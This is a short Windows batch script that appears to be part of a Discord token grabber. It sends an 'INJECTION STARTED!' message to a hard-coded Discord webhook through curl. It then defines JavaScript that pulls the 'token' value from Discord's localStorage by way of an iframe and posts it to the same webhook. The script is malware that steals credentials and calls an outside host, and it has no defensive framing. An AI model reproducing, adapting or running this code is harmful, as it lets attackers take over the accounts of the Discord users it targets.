@echo off
C:/temp/curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**INJECTION STARTED!**\"}" https://discord.com/api/webhooks/922826600951709768/pKiPkd5iocEVBe0cQMIAJxFZRiNLc2eXHBWVb1wz4OGx6XnbOy1X8IERPscmq1o-gAzY
set str=var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', 'https://discord.com/api/webhooks/922826600951709768/pKiPkd5iocEVBe0cQMIAJxFZRiNLc2eXHBWVb1wz4OGx6XnbOy1X8IERPscmq1o-gAzY', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}');
